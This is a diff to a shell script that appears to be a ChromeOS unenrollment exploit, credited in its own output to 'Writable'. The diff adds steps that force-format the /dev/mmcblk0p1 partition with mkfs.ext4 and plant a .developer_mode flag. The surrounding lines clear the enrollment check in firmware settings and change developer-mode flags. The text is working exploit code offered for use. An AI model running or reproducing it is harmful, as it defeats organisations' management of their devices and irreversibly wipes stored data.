@@ -8,7 +8,7 @@
 
 set -eE
 
-SCRIPT_DATE="[2024-04-18]"
+SCRIPT_DATE="[2024-05-14]"
 BACKUP_PAYLOAD=unenroll.tar.gz
 NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB
 
@@ -118,6 +118,13 @@ cleanup
 vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
 crossystem disable_dev_request=1 || :
 crossystem disable_dev_request=1 # grunt weirdness
+
+echo "Skipping dev mode wait"
+mkfs.ext4 /dev/mmcblk0p1 -F
+mount -o loop,rw /dev/mmcblk0p1 /tmp
+touch /tmp/.developer_mode
+umount /tmp && sync
+
 echo "SMITED SUCCESSFULLY!"
 echo ""
 echo "Exploit and original POC created by Writable (unretained)"
